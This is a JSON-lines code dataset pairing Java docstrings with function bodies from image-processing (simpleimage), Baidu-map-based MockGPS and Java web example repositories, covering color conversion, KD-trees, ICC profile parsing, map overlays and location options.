{"docstring": "/**\n * <pre>\n * \u4e3a\u4e86\u964d\u4f4e\u5b58\u50a8\u7a7a\u95f4\uff0c \u6ca1\u6709\u5fc5\u8981\u4fdd\u6301jpeg alpha\u901a\u9053. \u5982\u679c\n * see: http://www.faqs.org/faqs/jpeg-faq/part1/section-12.html\n * </pre>\n * \n * @param src\n * @return\n */\n", "func_signal": "public static PlanarImage convertRGBA2RGB(PlanarImage src)", "code": "{\n    ColorModel cm = src.getColorModel();\n\n    // RGB\u5e76\u4e14\u4e3a\u56db\u901a\u9053\uff0c \u5220\u9664\u6389alpha\u901a\u9053\n    if (cm.getColorSpace().getType() == ColorSpace.TYPE_RGB && src.getNumBands() == 4) {\n        if(!cm.getColorSpace().isCS_sRGB()) {\n            src = generalColorConvert(src);\n        }\n        \n        ParameterBlock pb = new ParameterBlock();\n        int[] bitsRGB = { 8, 8, 8 };\n        ColorSpace sRGB = ColorSpace.getInstance(ColorSpace.CS_sRGB);\n        ColorModel cmRGB = new ComponentColorModel(sRGB, bitsRGB, false, false, Transparency.OPAQUE,\n                                                   DataBuffer.TYPE_BYTE);\n        ImageLayout il = new ImageLayout();\n\n        il.setColorModel(cmRGB);\n\n        RenderingHints rh = new RenderingHints(JAI.KEY_IMAGE_LAYOUT, il);\n\n        il.setSampleModel(cmRGB.createCompatibleSampleModel(src.getTileWidth(), src.getTileHeight()));\n        pb = new ParameterBlock();\n        pb.addSource(src);\n        src = JAI.create(\"format\", pb, rh);\n    }\n\n    return src;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\util\\ImageColorConvertHelper.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param target\n * @param refDouble \u5fc5\u987b\u4ece\u5916\u90e8\u4f20\u5165\u4e00\u4e2a\uff0c\u4e14\u4e0d\u80fd\u662f\u7f13\u5b58\u5bf9\u8c61\n * @return\n */\n", "func_signal": "public IKDTreeDomain nearestNeighbour(IKDTreeDomain target, RefFloat ref)", "code": "{\n    HyperRectangle hr = HyperRectangle.createUniverseRectangle(target.dim);\n\n    IKDTreeDomain nearest = nearestNeighbourI(target, hr, Float.POSITIVE_INFINITY, ref);\n    // Math.sqrt(ref.val);\n    return (nearest);\n}", "path": "simpleimage.analyze\\src\\main\\java\\com\\alibaba\\simpleimage\\analyze\\kdtree\\KDTree.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param stretch\n * @param maxWidth\n * @param maxHeight\n * @param algorithm\n */\n", "func_signal": "public ScaleParameter(int maxWidth, int maxHeight, Algorithm algorithm)", "code": "{\n    super();\n    this.maxWidth = maxWidth;\n    this.maxHeight = maxHeight;\n    this.algorithm = algorithm;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\ScaleParameter.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param text\n */\n", "func_signal": "public FixDrawTextItem(String text)", "code": "{\n    super(text, FONT_COLOR, FONT_SHADOW_COLOR, FONT, MIN_FONT_SIZE);\n    this.position = Position.CENTER;\n    this.textWidthPercent = DEFAULT_TEXT_WIDTH_PERCENT;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\FixDrawTextItem.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/*\n * (non-Javadoc)\n * @see\n * com.alibaba.simpleimage.jpeg.ExtendImageHeaderReader#readProperties(com.alibaba.simpleimage.jpeg.ImageInputStream\n * , com.alibaba.simpleimage.jpeg.ExtendImageHeader)\n */\n", "func_signal": "public void readProperties(ImageInputStream in, int len, ExtendImageHeader imageHeader) throws IOException", "code": "{\n    try {\n        if (len < MarkerConstants.ICC_PROFILE_LABEL.length) {\n            // this APP2 marker is not used by ICC profile just ignore\n            return;\n        }\n\n        if (errorOnParse) {\n            return;\n        }\n\n        byte[] label = new byte[MarkerConstants.ICC_PROFILE_LABEL.length];\n        in.read(label);\n        len -= label.length;\n\n        if (!isICCProfileLabel(label)) {\n            // just ignore this marker\n            return;\n        }\n\n        int seq = in.read();\n        int nums = in.read();\n        len -= 2;\n\n        // verify seq\n        if (numOfChunks == 0) {\n            numOfChunks = nums;\n        } else {\n            if (nums != numOfChunks) {\n                errorOnParse = true;\n\n                return;\n            }\n        }\n\n        if (seq > numOfChunks) {\n            errorOnParse = true;\n\n            return;\n        }\n        // end verify\n\n        byte[] data = new byte[len];\n        in.read(data);\n        len = 0;\n\n        if (rawProfileData == null) {\n            rawProfileData = new byte[numOfChunks + 1][];\n        }\n\n        rawProfileData[seq] = data;\n        totalLength += data.length;\n        numOfRed++;\n\n        if (numOfRed == numOfChunks) {\n            imageHeader.setExistProfile(true);\n            imageHeader.setProfileData(getProfileData());\n        }\n    } finally {\n        if (len > 0) {\n            in.skipBytes(len);\n        }\n    }\n\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\codec\\jpeg\\ext\\ICCProfileReader.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/*\n * (non-Javadoc)\n * @see com.alibaba.simpleimage.ImageRender#render()\n */\n", "func_signal": "@Override\npublic ImageWrapper render() throws SimpleImageException", "code": "{\n    try {\n        if (image == null) {\n            image = imageRender.render();\n        }\n\n        ImageWriteHelper.write(image, stream, outputFormat, param);\n    } catch (Exception e) {\n        throw new SimpleImageException(e);\n    }\n\n    return null;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\WriteRender.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param text\n * @param fontColor\n * @param fontShadowColor\n * @param font\n * @param minFontSize\n */\n", "func_signal": "public FixDrawTextItem(String text, Color fontColor, Color fontShadowColor, Font font, int minFontSize,\n                       Position position, float textWidthPercent)", "code": "{\n    super(text, fontColor, fontShadowColor, font, minFontSize);\n    this.position = position;\n    this.textWidthPercent = textWidthPercent;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\FixDrawTextItem.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param watermark the watermark to set\n */\n", "func_signal": "public void setWatermark(ImageWrapper watermark)", "code": "{\n    if(watermark == null) {\n        throw new IllegalArgumentException(\"Watermark must not be null\");\n    }\n    this.watermark = watermark;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\WatermarkParameter.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param al\n * @return\n */\n", "func_signal": "public static KDTree createKDTree(List<? extends IKDTreeDomain> exset)", "code": "{\n    if (exset.size() == 0) return (null);\n    KDTree cur = new KDTree();\n    RefInt splitDim = new RefInt();\n    splitDim.val = cur.splitDim;\n    cur.dr = goodCandidate(exset, splitDim);\n    cur.splitDim = splitDim.val;// ou ref cur.splitDim\n    ArrayList<IKDTreeDomain> leftElems = new ArrayList<IKDTreeDomain>();\n    ArrayList<IKDTreeDomain> rightElems = new ArrayList<IKDTreeDomain>();\n\n    // split the exemplar set into left/right elements relative to the\n    // splitting dimension\n    float bound = cur.dr.descriptor[splitDim.val];\n    for (IKDTreeDomain dom : exset) {\n        // ignore the current element\n        if (dom == cur.dr) continue;\n\n        if (dom.descriptor[splitDim.val] <= bound) {\n            leftElems.add(dom);\n        } else {\n            rightElems.add(dom);\n        }\n    }\n\n    // recurse\n    cur.left = createKDTree(leftElems);\n    cur.right = createKDTree(rightElems);\n    return (cur);\n}", "path": "simpleimage.analyze\\src\\main\\java\\com\\alibaba\\simpleimage\\analyze\\kdtree\\KDTree.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/**\n * @param x the x to set\n */\n", "func_signal": "public void setX(int x)", "code": "{\n    if(x < 0) {\n        throw new IllegalArgumentException(\"x must be greater than 0\");\n    }\n    this.x = x;\n}", "path": "simpleimage.core\\src\\main\\java\\com\\alibaba\\simpleimage\\render\\WatermarkParameter.java", "repo_name": "alibaba/simpleimage", "stars": 994, "license": "apache-2.0", "language": "java", "size": 56754}
{"docstring": "/***\n *\n * @return DefaultLocationClientOption  \u9ed8\u8ba4O\u8bbe\u7f6e\n */\n", "func_signal": "public LocationClientOption getDefaultLocationClientOption()", "code": "{\n\tif(mOption == null){\n\t\tmOption = new LocationClientOption();\n\t\tmOption.setLocationMode(LocationMode.Hight_Accuracy);//\u53ef\u9009\uff0c\u9ed8\u8ba4\u9ad8\u7cbe\u5ea6\uff0c\u8bbe\u7f6e\u5b9a\u4f4d\u6a21\u5f0f\uff0c\u9ad8\u7cbe\u5ea6\uff0c\u4f4e\u529f\u8017\uff0c\u4ec5\u8bbe\u5907\n\t\tmOption.setCoorType(\"bd09ll\");//\u53ef\u9009\uff0c\u9ed8\u8ba4gcj02\uff0c\u8bbe\u7f6e\u8fd4\u56de\u7684\u5b9a\u4f4d\u7ed3\u679c\u5750\u6807\u7cfb\uff0c\u5982\u679c\u914d\u5408\u767e\u5ea6\u5730\u56fe\u4f7f\u7528\uff0c\u5efa\u8bae\u8bbe\u7f6e\u4e3abd09ll;\n\t\tmOption.setScanSpan(3000);//\u53ef\u9009\uff0c\u9ed8\u8ba40\uff0c\u5373\u4ec5\u5b9a\u4f4d\u4e00\u6b21\uff0c\u8bbe\u7f6e\u53d1\u8d77\u8fde\u7eed\u5b9a\u4f4d\u8bf7\u6c42\u7684\u95f4\u9694\u9700\u8981\u5927\u4e8e\u7b49\u4e8e1000ms\u624d\u662f\u6709\u6548\u7684\n\t    mOption.setIsNeedAddress(true);//\u53ef\u9009\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981\u5730\u5740\u4fe1\u606f\uff0c\u9ed8\u8ba4\u4e0d\u9700\u8981\n\t    mOption.setIsNeedLocationDescribe(true);//\u53ef\u9009\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981\u5730\u5740\u63cf\u8ff0\n\t    mOption.setNeedDeviceDirect(false);//\u53ef\u9009\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981\u8bbe\u5907\u65b9\u5411\u7ed3\u679c\n\t    mOption.setLocationNotify(false);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u662f\u5426\u5f53gps\u6709\u6548\u65f6\u6309\u71671S1\u6b21\u9891\u7387\u8f93\u51faGPS\u7ed3\u679c\n\t    mOption.setIgnoreKillProcess(true);//\u53ef\u9009\uff0c\u9ed8\u8ba4true\uff0c\u5b9a\u4f4dSDK\u5185\u90e8\u662f\u4e00\u4e2aSERVICE\uff0c\u5e76\u653e\u5230\u4e86\u72ec\u7acb\u8fdb\u7a0b\uff0c\u8bbe\u7f6e\u662f\u5426\u5728stop\u7684\u65f6\u5019\u6740\u6b7b\u8fd9\u4e2a\u8fdb\u7a0b\uff0c\u9ed8\u8ba4\u4e0d\u6740\u6b7b   \n\t    mOption.setIsNeedLocationDescribe(true);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981\u4f4d\u7f6e\u8bed\u4e49\u5316\u7ed3\u679c\uff0c\u53ef\u4ee5\u5728BDLocation.getLocationDescribe\u91cc\u5f97\u5230\uff0c\u7ed3\u679c\u7c7b\u4f3c\u4e8e\u201c\u5728\u5317\u4eac\u5929\u5b89\u95e8\u9644\u8fd1\u201d\n\t    mOption.setIsNeedLocationPoiList(true);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u662f\u5426\u9700\u8981POI\u7ed3\u679c\uff0c\u53ef\u4ee5\u5728BDLocation.getPoiList\u91cc\u5f97\u5230\n\t    mOption.SetIgnoreCacheException(false);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u662f\u5426\u6536\u96c6CRASH\u4fe1\u606f\uff0c\u9ed8\u8ba4\u6536\u96c6\n\t\tmOption.setOpenGps(true);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u662f\u5426\u5f00\u542fGps\u5b9a\u4f4d\n\t    mOption.setIsNeedAltitude(false);//\u53ef\u9009\uff0c\u9ed8\u8ba4false\uff0c\u8bbe\u7f6e\u5b9a\u4f4d\u65f6\u662f\u5426\u9700\u8981\u6d77\u62d4\u4fe1\u606f\uff0c\u9ed8\u8ba4\u4e0d\u9700\u8981\uff0c\u9664\u57fa\u7840\u5b9a\u4f4d\u7248\u672c\u90fd\u53ef\u7528\n\t \n\t}\n\treturn mOption;\n}", "path": "app\\src\\main\\java\\com\\example\\service\\LocationService.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/***\n * \n * @param locationContext\n */\n", "func_signal": "public LocationService(Context locationContext)", "code": "{\n\tsynchronized (objLock) {\n\t\tif(client == null){\n\t\t\tclient = new LocationClient(locationContext);\n\t\t\tclient.setLocOption(getDefaultLocationClientOption());\n\t\t}\n\t}\n}", "path": "app\\src\\main\\java\\com\\example\\service\\LocationService.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n *\n * @return DIYOption \u81ea\u5b9a\u4e49Option\u8bbe\u7f6e\n */\n", "func_signal": "public LocationClientOption getOption()", "code": "{\n\tif(DIYoption == null) {\n\t\tDIYoption = new LocationClientOption();\n\t}\n\treturn DIYoption;\n}", "path": "app\\src\\main\\java\\com\\example\\service\\LocationService.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n * \u901a\u8fc7\u4e00\u4e2aBaiduMap \u5bf9\u8c61\u6784\u9020\n * \n * @param baiduMap\n */\n", "func_signal": "public OverlayManager(BaiduMap baiduMap)", "code": "{\n    mBaiduMap = baiduMap;\n    // mBaiduMap.setOnMarkerClickListener(this);\n    if (mOverlayOptionList == null) {\n        mOverlayOptionList = new ArrayList<OverlayOptions>();\n    }\n    if (mOverlayList == null) {\n        mOverlayList = new ArrayList<Overlay>();\n    }\n}", "path": "app\\src\\main\\java\\mapapi\\overlayutil\\OverlayManager.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "//MOBILE\u7f51\u7edc\u662f\u5426\u53ef\u7528\n", "func_signal": "private boolean isMobileConnected()", "code": "{\n    ConnectivityManager mConnectivityManager = (ConnectivityManager) this.getSystemService(Context.CONNECTIVITY_SERVICE);\n    NetworkInfo mMobileNetworkInfo = mConnectivityManager\n            .getNetworkInfo(ConnectivityManager.TYPE_MOBILE);\n    if (mMobileNetworkInfo != null) {\n        return mMobileNetworkInfo.isAvailable();\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\example\\mockgps\\OfflineMapActivity.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "//WIFI\u662f\u5426\u53ef\u7528\n", "func_signal": "private boolean isWifiConnected()", "code": "{\n    ConnectivityManager mConnectivityManager = (ConnectivityManager)getContext().getSystemService(Context.CONNECTIVITY_SERVICE);\n    NetworkInfo mWiFiNetworkInfo = mConnectivityManager\n            .getNetworkInfo(ConnectivityManager.TYPE_WIFI);\n    if (mWiFiNetworkInfo != null) {\n        return mWiFiNetworkInfo.isAvailable();\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\example\\mockgps\\PageFragment.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "//MOBILE\u7f51\u7edc\u662f\u5426\u53ef\u7528\n", "func_signal": "private boolean isMobileConnected()", "code": "{\n    ConnectivityManager mConnectivityManager = (ConnectivityManager) getContext().getSystemService(Context.CONNECTIVITY_SERVICE);\n    NetworkInfo mMobileNetworkInfo = mConnectivityManager\n            .getNetworkInfo(ConnectivityManager.TYPE_MOBILE);\n    if (mMobileNetworkInfo != null) {\n        return mMobileNetworkInfo.isAvailable();\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\example\\mockgps\\PageFragment.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n * \u5c06\u6240\u6709Overlay \u4ece \u5730\u56fe\u4e0a\u6d88\u9664\n */\n", "func_signal": "public final void removeFromMap()", "code": "{\n    if (mBaiduMap == null) {\n        return;\n    }\n    for (Overlay marker : mOverlayList) {\n        marker.remove();\n    }\n    mOverlayOptionList.clear();\n    mOverlayList.clear();\n\n}", "path": "app\\src\\main\\java\\mapapi\\overlayutil\\OverlayManager.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "//WIFI\u662f\u5426\u53ef\u7528\n", "func_signal": "private boolean isWifiConnected()", "code": "{\n    ConnectivityManager mConnectivityManager = (ConnectivityManager)this.getSystemService(Context.CONNECTIVITY_SERVICE);\n    NetworkInfo mWiFiNetworkInfo = mConnectivityManager\n            .getNetworkInfo(ConnectivityManager.TYPE_WIFI);\n    if (mWiFiNetworkInfo != null) {\n        return mWiFiNetworkInfo.isAvailable();\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\example\\mockgps\\OfflineMapActivity.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n * \u8986\u5199\u6b64\u65b9\u6cd5\u4ee5\u6539\u53d8\u9ed8\u8ba4\u70b9\u51fb\u884c\u4e3a\n * \n * @param index\n *            \u88ab\u70b9\u51fb\u7684\u7ad9\u70b9\u5728\n *            {@link com.baidu.mapapi.search.busline.BusLineResult#getStations()}\n *            \u4e2d\u7684\u7d22\u5f15\n * @return \u662f\u5426\u5904\u7406\u4e86\u8be5\u70b9\u51fb\u4e8b\u4ef6\n */\n", "func_signal": "public boolean onBusStationClick(int index)", "code": "{\n    if (mBusLineResult.getStations() != null\n            && mBusLineResult.getStations().get(index) != null) {\n        Log.i(\"baidumapsdk\", \"BusLineOverlay onBusStationClick\");\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\mapapi\\overlayutil\\BusLineOverlay.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n * \u8986\u5199\u6b64\u65b9\u6cd5\u4ee5\u6539\u53d8\u9ed8\u8ba4\u70b9\u51fb\u5904\u7406\n * \n * @param i\n *            \u7ebf\u8def\u8282\u70b9\u7684 index\n * @return \u662f\u5426\u5904\u7406\u4e86\u8be5\u70b9\u51fb\u4e8b\u4ef6\n */\n", "func_signal": "public boolean onRouteNodeClick(int i)", "code": "{\n    if (mRouteLine.getAllStep() != null\n            && mRouteLine.getAllStep().get(i) != null) {\n        Log.i(\"baidumapsdk\", \"DrivingRouteOverlay onRouteNodeClick\");\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\mapapi\\overlayutil\\DrivingRouteOverlay.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n * \u5c06\u6240\u6709Overlay \u6dfb\u52a0\u5230\u5730\u56fe\u4e0a\n */\n", "func_signal": "public final void addToMap()", "code": "{\n    if (mBaiduMap == null) {\n        return;\n    }\n\n    removeFromMap();\n    List<OverlayOptions> overlayOptions = getOverlayOptions();\n    if (overlayOptions != null) {\n        mOverlayOptionList.addAll(getOverlayOptions());\n    }\n\n    for (OverlayOptions option : mOverlayOptionList) {\n        mOverlayList.add(mBaiduMap.addOverlay(option));\n    }\n}", "path": "app\\src\\main\\java\\mapapi\\overlayutil\\OverlayManager.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n * \u8986\u5199\u6b64\u65b9\u6cd5\u4ee5\u6539\u53d8\u8d77\u9ed8\u8ba4\u70b9\u51fb\u884c\u4e3a\n * \n * @param i\n *            \u88ab\u70b9\u51fb\u7684step\u5728\n *            {@link com.baidu.mapapi.search.route.TransitRouteLine#getAllStep()}\n *            \u4e2d\u7684\u7d22\u5f15\n * @return \u662f\u5426\u5904\u7406\u4e86\u8be5\u70b9\u51fb\u4e8b\u4ef6\n */\n", "func_signal": "public boolean onRouteNodeClick(int i)", "code": "{\n    if (mRouteLine.getAllStep() != null\n            && mRouteLine.getAllStep().get(i) != null) {\n        Log.i(\"baidumapsdk\", \"TransitRouteOverlay onRouteNodeClick\");\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\mapapi\\overlayutil\\TransitRouteOverlay.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/***\n * \n * @param option\n * @return isSuccessSetOption\n */\n", "func_signal": "public boolean setLocationOption(LocationClientOption option)", "code": "{\n\tboolean isSuccess = false;\n\tif(option != null){\n\t\tif(client.isStarted())\n\t\t\tclient.stop();\n\t\tDIYoption = option;\n\t\tclient.setLocOption(option);\n\t}\n\treturn isSuccess;\n}", "path": "app\\src\\main\\java\\com\\example\\service\\LocationService.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n * \u5904\u7406\u70b9\u51fb\u4e8b\u4ef6\n * \n * @param i\n *            \u88ab\u70b9\u51fb\u7684step\u5728\n *            {@link com.baidu.mapapi.search.route.WalkingRouteLine#getAllStep()}\n *            \u4e2d\u7684\u7d22\u5f15\n * @return \u662f\u5426\u5904\u7406\u4e86\u8be5\u70b9\u51fb\u4e8b\u4ef6\n */\n", "func_signal": "public boolean onRouteNodeClick(int i)", "code": "{\n    if (mRouteLine.getAllStep() != null\n            && mRouteLine.getAllStep().get(i) != null) {\n        Log.i(\"baidumapsdk\", \"WalkingRouteOverlay onRouteNodeClick\");\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\mapapi\\overlayutil\\WalkingRouteOverlay.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/***\n * \n * @param listener\n * @return\n */\n", "func_signal": "public boolean registerListener(BDAbstractLocationListener listener)", "code": "{\n\tboolean isSuccess = false;\n\tif(listener != null){\n\t\tclient.registerLocationListener(listener);\n\t\tisSuccess = true;\n\t}\n\treturn  isSuccess;\n}", "path": "app\\src\\main\\java\\com\\example\\service\\LocationService.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n * \u914d\u7f6elog4j\u53c2\u6570\n */\n", "func_signal": "public static void configLog()", "code": "{\n\n    LogConfig logConfig = new LogConfig();\n\n    /** \u8bbe\u7f6eLog\u7b49\u7ea7\uff0c\u751f\u4ea7\u73af\u5883\u4e0b\u8c03\u7528setLogToProduce()\uff0c\u53d1\u5e03\u540e\u8c03\u7528setLogToRelease() **/\n    setLogToProduce(logConfig);\n//        setLogToRelease(logConfig);\n\n    logConfig.setFileName(LOG_FILE_PATH);\n\n    logConfig.setLevel(\"org.apache\", Level.ERROR);\n\n    logConfig.setFilePattern(LOG_FILE_PATTERN);\n\n    logConfig.setMaxFileSize(1024 * 1024 * 5);\n\n    logConfig.setImmediateFlush(true);\n\n    logConfig.configure();\n\n}", "path": "app\\src\\main\\java\\com\\example\\log4j\\LogUtil.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "// \u5f53\u641c\u7d22\u5185\u5bb9\u6539\u53d8\u65f6\u89e6\u53d1\u8be5\u65b9\u6cd5\n", "func_signal": "@Override\npublic boolean onQueryTextChange(String newText)", "code": "{\n    if (TextUtils.isEmpty(newText)){\n        tipText.setText(\"\u5168\u56fd\");\n        simAdapt = new SimpleAdapter(\n                PageFragment.this.getContext(),\n                allCityList,\n                R.layout.offline_city_item,\n                new String[]{\"key_cityname\", \"key_citysize\",\"key_cityid\"},// \u4e0e\u4e0b\u9762\u6570\u7ec4\u5143\u7d20\u8981\u4e00\u4e00\u5bf9\u5e94\n                new int[]{R.id.CityNameText, R.id.CitySizeText,R.id.CityIDText});\n        cityListView.setAdapter(simAdapt);\n    }else{\n        ArrayList<MKOLSearchRecord> records = mOffline.searchCity(newText);\n        List<Map<String, Object>> searchRet=new ArrayList<Map<String, Object>>();\n        if (records!=null){\n            if (records.size() > 0) {\n                tipText.setText(\"\u641c\u7d22\u7ed3\u679c\");\n                for (MKOLSearchRecord r :records){\n                    Log.d(\"CITY\",\"\"+r.cityName);\n                    Map<String, Object> item = new HashMap<String, Object>();\n                    item.put(\"key_cityname\", r.cityName);\n                    item.put(\"key_citysize\", formatDataSize(r.dataSize));\n                    item.put(\"key_cityid\", r.cityID);\n                    searchRet.add(item);\n                }\n                simAdapt = new SimpleAdapter(\n                        PageFragment.this.getContext(),\n                        searchRet,\n                        R.layout.offline_city_item,\n                        new String[]{\"key_cityname\", \"key_citysize\",\"key_cityid\"},// \u4e0e\u4e0b\u9762\u6570\u7ec4\u5143\u7d20\u8981\u4e00\u4e00\u5bf9\u5e94\n                        new int[]{R.id.CityNameText, R.id.CitySizeText,R.id.CityIDText});\n                cityListView.setAdapter(simAdapt);\n            }\n        }\n        else {\n            tipText.setText(\"\u70ed\u95e8\u57ce\u5e02\");\n            DisplayToast(\"\u672a\u641c\u7d22\u5230\u8be5\u57ce\u5e02,\u6216\u8be5\u57ce\u5e02\u4e0d\u652f\u6301\u79bb\u7ebf\u5730\u56fe\");\n            simAdapt = new SimpleAdapter(\n                    PageFragment.this.getContext(),\n                    hotCityList,\n                    R.layout.offline_city_item,\n                    new String[]{\"key_cityname\", \"key_citysize\",\"key_cityid\"},// \u4e0e\u4e0b\u9762\u6570\u7ec4\u5143\u7d20\u8981\u4e00\u4e00\u5bf9\u5e94\n                    new int[]{R.id.CityNameText, R.id.CitySizeText,R.id.CityIDText});\n            cityListView.setAdapter(simAdapt);\n        }\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\example\\mockgps\\PageFragment.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "/**\n * \u7f29\u653e\u5730\u56fe\uff0c\u4f7f\u6240\u6709Overlay\u90fd\u5728\u5408\u9002\u7684\u89c6\u91ce\u5185\n * <p>\n * \u6ce8\uff1a \u8be5\u65b9\u6cd5\u53ea\u5bf9Marker\u7c7b\u578b\u7684overlay\u6709\u6548\n * </p>\n * \n */\n", "func_signal": "public void zoomToSpan()", "code": "{\n    if (mBaiduMap == null) {\n        return;\n    }\n    if (mOverlayList.size() > 0) {\n        LatLngBounds.Builder builder = new LatLngBounds.Builder();\n        for (Overlay overlay : mOverlayList) {\n            // polyline \u4e2d\u7684\u70b9\u53ef\u80fd\u592a\u591a\uff0c\u53ea\u6309marker \u7f29\u653e\n            if (overlay instanceof Marker) {\n                builder.include(((Marker) overlay).getPosition());\n            }\n        }\n        mBaiduMap.setMapStatus(MapStatusUpdateFactory\n                .newLatLngBounds(builder.build()));\n    }\n}", "path": "app\\src\\main\\java\\mapapi\\overlayutil\\OverlayManager.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "// \u83b7\u53d6\u7cfb\u7edf\u72b6\u6001\u680f\u9ad8\u5ea6\n", "func_signal": "@SuppressLint(\"PrivateApi\")\nprivate static int getSysBarHeight(Context contex)", "code": "{\n    Class<?> c;\n    Object obj;\n    Field field;\n    int x;\n    int sbar = 0;\n    try {\n        c = Class.forName(\"com.android.internal.R$dimen\");\n        obj = c.newInstance();\n        field = c.getField(\"status_bar_height\");\n        x = Integer.parseInt(field.get(obj).toString());\n        sbar = contex.getResources().getDimensionPixelSize(x);\n    } catch (Exception e1) {\n        e1.printStackTrace();\n    }\n    return sbar;\n}", "path": "app\\src\\main\\java\\com\\example\\service\\FloatWindow.java", "repo_name": "Hilaver/MockGPS", "stars": 759, "license": "gpl-3.0", "language": "java", "size": 142695}
{"docstring": "// \u027e\u05b7\u0435\u05b8\n", "func_signal": "public static String deleteString(String oldString, String del)", "code": "{\n\tString oldStrings[] = oldString.split(\",\");\n\tString newStrings[] = new String[oldStrings.length - 1];\n\tint j = 0;\n\tfor (int i = 0; i < oldStrings.length; i++) {\n\t\tif (!del.equals(oldStrings[i])) {\n\t\t\tnewStrings[j] = oldStrings[i];\n\t\t\tj++;\n\t\t}\n\t}\n\tString sy = \",\";\n\tString newString = \"\";\n\tfor (int a = 0; a < newStrings.length; a++) {\n\t\tif (a == newStrings.length - 1) {\n\t\t\tsy = \"\";\n\t\t}\n\n\t\tnewString = newString + newStrings[a] + sy;\n\t}\n\n\treturn newString;\n}", "path": "03\\src\\com\\mr\\tools\\ValidateExpression.java", "repo_name": "maxliaops/Java_Web_Examples", "stars": 587, "license": "None", "language": "java", "size": 105216}
